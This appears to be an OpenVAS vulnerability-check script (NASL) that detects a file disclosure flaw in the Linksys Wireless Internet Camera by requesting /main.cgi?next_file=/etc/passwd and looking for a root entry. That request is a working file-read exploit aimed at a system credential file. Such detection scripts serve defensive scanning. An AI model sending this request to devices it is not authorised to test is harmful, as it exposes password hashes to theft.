# OpenVAS Vulnerability Test
# $Id: linksys_next_file_file_disclosure.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Linksys Wireless Internet Camera File Disclosure
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The Linksys Wireless Internet Camera contains a CGI that allows remote
attackers to disclosue sensitive files stored on the server.

An attacker may use this CGI to disclosue the password file and from it
the password used by the root use (the MD5 value).";

# Contact: sf@cicsos.dk
# Subject: Linksys Wireless Internet Camera
# Date: 	Jun 23 02:05:11 2004

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.13636");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_cve_id("CVE-2004-2508");
 script_bugtraq_id(10533);
 script_name("Linksys Wireless Internet Camera File Disclosure");
 
 

 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

req = http_get(item:"/main.cgi?next_file=/etc/passwd", port:port);

res = http_keepalive_send_recv(port:port, data:req);
if ( res == NULL ) exit(0);

if ( egrep ( pattern:".*root:.*:0:[01]:.*", string:res) )
	security_message(port);

